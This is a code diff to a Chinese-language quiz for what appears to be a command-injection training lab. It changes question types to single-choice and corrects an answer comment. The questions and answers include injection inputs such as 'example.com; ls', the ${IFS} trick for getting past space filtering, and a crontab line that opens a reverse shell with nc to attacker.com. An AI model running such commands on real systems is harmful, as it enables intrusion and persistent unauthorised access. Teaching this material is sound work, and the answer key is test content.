@@ -17,7 +17,7 @@ export const CommandInjectionExperiment = {
           content: '命令注入攻击主要利用了什么安全漏洞？',
           score: 2,
           requiresTarget: false,
-          type: 'multiple-choice',
+          type: 'single-choice',
           options: ['操作系统内核漏洞', '用户输入未经充分过滤直接用于系统命令', '网络防火墙配置错误', '浏览器安全设置不当'],
           answer: [1] // 用户输入未经充分过滤直接用于系统命令
         },
@@ -26,7 +26,7 @@ export const CommandInjectionExperiment = {
           content: '以下哪个字符可以用于连接两个不同的系统命令？',
           score: 3,
           requiresTarget: false,
-          type: 'multiple-choice',
+          type: 'single-choice',
           options: ['.', ':', ';', '?'],
           answer: [2] // ;
         }
@@ -44,7 +44,7 @@ export const CommandInjectionExperiment = {
           content: '如果Web应用使用以下代码处理ping请求：`exec("ping " + userInput)`，哪个输入最可能实现命令注入？',
           score: 3,
           requiresTarget: false,
-          type: 'multiple-choice',
+          type: 'single-choice',
           options: ['example.com', '192.168.1.1', 'example.com; ls', 'ping'],
           answer: [2] // example.com; ls
         },
@@ -53,7 +53,7 @@ export const CommandInjectionExperiment = {
           content: '命令注入攻击中，${IFS}的作用是什么？',
           score: 4,
           requiresTarget: false,
-          type: 'multiple-choice',
+          type: 'single-choice',
           options: ['终止命令执行', '提升执行权限', '绕过空格过滤', '隐藏命令执行历史'],
           answer: [2] // 绕过空格过滤
         }
@@ -80,9 +80,9 @@ export const CommandInjectionExperiment = {
           content: '以下哪个命令最可能被用于在命令注入攻击中建立持久化访问？',
           score: 4,
           requiresTarget: false,
-          type: 'multiple-choice',
+          type: 'single-choice',
           options: ['ls -la', 'echo "* * * * * nc -e /bin/bash attacker.com 4444" | crontab -', 'cat /etc/passwd', 'ping -c 4 8.8.8.8'],
-          answer: [1] // ls -la
+          answer: [1] // echo ... | crontab - (persistent access via cron)
         }
       ]
     },
